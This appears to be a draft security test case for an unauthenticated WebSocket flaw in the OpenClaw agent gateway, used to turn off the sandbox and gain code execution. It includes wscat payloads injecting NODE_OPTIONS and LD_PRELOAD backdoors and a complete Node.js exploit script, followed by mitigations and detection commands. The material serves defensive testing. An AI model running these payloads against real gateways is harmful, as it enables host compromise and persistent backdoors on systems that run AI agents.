---
date: 2026-03-13
category: test-cases
subcategory: agent-hijack
severity: high
test_id: TC-AH-001
status: draft
ghsa: GHSA-g55j-c2v4-pjcg
cve: CVE-2026-25593
---

# Test 1: WebSocket RCE via config.apply

## Test Overview

| Item | Content |
|------|---------|
| Test ID | TC-AH-001 |
| Category | Agent Hijack / RCE |
| Attack Vector | Unauthenticated WebSocket |
| Severity | High |
| Difficulty | Advanced |
| GHSA Reference | [GHSA-g55j-c2v4-pjcg](https://github.com/openclaw/openclaw/security/advisories/GHSA-g55j-c2v4-pjcg) |
| CVE | CVE-2026-25593 |
| Fixed In | v2026.1.20 |

## Objective

Verify that OpenClaw's WebSocket endpoint properly requires authentication for the `config.apply` method, preventing unauthenticated remote code execution.

## Vulnerability Description

OpenClaw's gateway exposes a WebSocket API for agent communication. The `config.apply` method allows applying configuration changes, including:
- Setting environment variables
- Modifying executable paths
- Changing sandbox settings

**Vulnerability**: Prior to v2026.1.20, the `config.apply` WebSocket method did not require authentication, allowing unauthenticated attackers to:
1. Connect to WebSocket endpoint (typically `ws://localhost:3000/ws`)
2. Send `config.apply` message with malicious configuration
3. Trigger code execution via environment variable injection or path manipulation

**Attack Pattern**:
```javascript
// Unauthenticated WebSocket connection
const ws = new WebSocket('ws://victim:3000/ws');

ws.onopen = () => {
  // Apply malicious configuration
  ws.send(JSON.stringify({
    method: 'config.apply',
    params: {
      env: {
        LD_PRELOAD: '/tmp/malicious.so',
        NODE_OPTIONS: '--require /tmp/backdoor.js'
      },
      sandbox: 'off'
    }
  }));
};
```

## Prerequisites

- [ ] OpenClaw v2026.1.19 or earlier (vulnerable)
- [ ] Gateway WebSocket enabled (default)
- [ ] Network access to gateway port (typically 3000)
- [ ] WebSocket client (wscat, Python, Node.js)

## Test Steps

### Step 1: Identify WebSocket Endpoint

```bash
# Check if gateway is running
curl -i http://localhost:3000/health

# Common WebSocket endpoints
# ws://localhost:3000/ws
# ws://localhost:3000/gateway
# ws://localhost:3000/socket
```

### Step 2: Connect Without Authentication

```bash
# Using wscat
npm install -g wscat
wscat -c ws://localhost:3000/ws

# No authentication required on vulnerable versions
```

### Step 3: Send Malicious config.apply

**Test 1: Disable sandbox**
```bash
# In wscat
> {"method":"config.apply","params":{"sandbox":"off"}}

# Expected (vulnerable): {"status":"ok","message":"Configuration applied"}
# Expected (secure): {"status":"error","message":"Unauthorized"}
```

**Test 2: Environment variable injection**
```bash
> {"method":"config.apply","params":{"env":{"NODE_OPTIONS":"--require /tmp/pwned.js"}}}
```

**Test 3: Path manipulation**
```bash
> {"method":"config.apply","params":{"execPath":"/tmp/fake-node"}}
```

### Step 4: Verify Code Execution

```bash
# Create test payload
cat > /tmp/pwned.js << 'EOF'
const fs = require('fs');
fs.writeFileSync('/tmp/websocket-rce-success.txt', 'PWNED');
console.log('Backdoor loaded');
EOF

# Send config.apply with NODE_OPTIONS
# Trigger any Node.js execution in OpenClaw
# Check for payload execution
cat /tmp/websocket-rce-success.txt
```

### Step 5: Automated Exploitation Script

```javascript
// exploit-websocket-rce.js
const WebSocket = require('ws');

const target = process.argv[2] || 'ws://localhost:3000/ws';
console.log(`[*] Connecting to ${target}`);

const ws = new WebSocket(target);

ws.on('open', () => {
  console.log('[+] WebSocket connected (no auth required!)');

  // Payload: Disable sandbox + inject backdoor
  const payload = {
    method: 'config.apply',
    params: {
      sandbox: 'off',
      env: {
        NODE_OPTIONS: '--require /tmp/backdoor.js'
      }
    }
  };

  console.log('[*] Sending malicious config.apply...');
  ws.send(JSON.stringify(payload));
});

ws.on('message', (data) => {
  console.log('[+] Response:', data.toString());

  const response = JSON.parse(data);
  if (response.status === 'ok') {
    console.log('[!] VULNERABLE: config.apply succeeded without auth');
    console.log('[!] Sandbox disabled, backdoor injected');
  } else if (response.status === 'error' && response.message.includes('Unauthorized')) {
    console.log('[✓] SECURE: Authentication required');
  }

  ws.close();
});

ws.on('error', (err) => {
  console.error('[-] Connection error:', err.message);
});
```

**Run exploit**:
```bash
node exploit-websocket-rce.js ws://victim-host:3000/ws
```

## Expected Results (Secure Behavior)

1. **Authentication required**: WebSocket connection requires token/credentials
2. **config.apply rejected**: Unauthorized requests return error
3. **Rate limiting**: Repeated unauthorized attempts are rate-limited
4. **Audit logging**: Failed auth attempts are logged

## Failure Criteria (Vulnerable Behavior)

1. **Unauthenticated access**: WebSocket accepts connections without auth
2. **config.apply succeeds**: Configuration changes applied
3. **Code execution**: Environment variable injection leads to RCE
4. **No logging**: Failed attempts not logged

## Test Results

| Item | Content |
|------|---------|
| Execution Date | - |
| OpenClaw Version | - |
| WebSocket Auth | Required / Not Required |
| config.apply Result | Blocked / Succeeded |
| Code Execution | Yes / No |
| Result | PASS / FAIL |

## Mitigation (If Vulnerable)

### Immediate Actions

1. **Upgrade OpenClaw**: Update to v2026.1.20+ where CVE-2026-25593 is fixed
2. **Block WebSocket port**: Firewall rules to restrict access
   ```bash
   # Allow only localhost
   iptables -A INPUT -p tcp --dport 3000 -s 127.0.0.1 -j ACCEPT
   iptables -A INPUT -p tcp --dport 3000 -j DROP
   ```
3. **Disable WebSocket**: Temporarily disable gateway WebSocket
   ```json
   {
     "gateway": {
       "websocket": {
         "enabled": false
       }
     }
   }
   ```
4. **Check for compromise**: Review logs for unauthorized `config.apply` calls

### Long-Term Fixes

**Fix: Require authentication for all WebSocket methods**
```javascript
const WebSocket = require('ws');

function handleWebSocketConnection(ws, req) {
  // Authenticate connection
  const token = req.headers['authorization'];
  if (!authenticateToken(token)) {
    ws.close(1008, 'Unauthorized');
    return;
  }

  ws.on('message', (data) => {
    const message = JSON.parse(data);

    // Require auth for sensitive methods
    if (SENSITIVE_METHODS.includes(message.method)) {
      if (!ws.authenticated) {
        ws.send(JSON.stringify({
          status: 'error',
          message: 'Unauthorized'
        }));
        return;
      }
    }

    // Handle message
    handleMessage(ws, message);
  });
}
```

**Fix: Whitelist allowed methods**
```javascript
const ALLOWED_METHODS = {
  'agent.status': { auth: false },
  'agent.ping': { auth: false },
  'config.apply': { auth: true, adminOnly: true },  // ← Restricted
  'config.get': { auth: true }
};

function isMethodAllowed(method, auth) {
  const config = ALLOWED_METHODS[method];
  if (!config) return false;
  if (config.auth && !auth.authenticated) return false;
  if (config.adminOnly && !auth.isAdmin) return false;
  return true;
}
```

## Related CVEs and Attacks

- **CVE-2019-15224**: Similar WebSocket auth bypass in another project
- **Electron WebSocket RCE**: Similar pattern in Electron apps

## Related Tests

- **Test 2**: gatewayUrl Token Theft — Related gateway authentication bypass
- **Test 5**: Gateway Node Invoke Bypass — Another gateway RCE vector

## References

- [GHSA-g55j-c2v4-pjcg](https://github.com/openclaw/openclaw/security/advisories/GHSA-g55j-c2v4-pjcg)
- [CVE-2026-25593](https://nvd.nist.gov/vuln/detail/CVE-2026-25593)
- [WebSocket Security](https://owasp.org/www-community/vulnerabilities/WebSocket_Security)
- [CWE-306: Missing Authentication](https://cwe.mitre.org/data/definitions/306.html)

## Attack Scenario

**Real-world exploitation chain**:

```
1. Attacker scans for OpenClaw gateway (port 3000)
   ↓
2. Connects to WebSocket without authentication
   ↓
3. Sends config.apply to disable sandbox
   ↓
4. Sends config.apply to inject NODE_OPTIONS backdoor
   ↓
5. Backdoor executes on next OpenClaw restart or agent spawn
   ↓
6. Attacker gains shell via reverse connection
```

**Impact**: Complete host compromise, persistent backdoor, credential theft.

## Detection

**Check for exploitation**:
```bash
# Review gateway logs for config.apply
grep "config.apply" ~/.openclaw/logs/gateway.log

# Check for unauthorized WebSocket connections
grep "ws.*connection" ~/.openclaw/logs/gateway.log | grep -v "authenticated"

# Check for modified configuration
diff ~/.openclaw/config.json ~/.openclaw/config.json.backup
```

## Notes

- This is a **High** severity RCE vulnerability
- Unauthenticated by design flaw, not just weak password
- Affects all OpenClaw instances with exposed gateway port
- Clean up: `rm /tmp/pwned.js /tmp/websocket-rce-success.txt`
- Always test on isolated systems
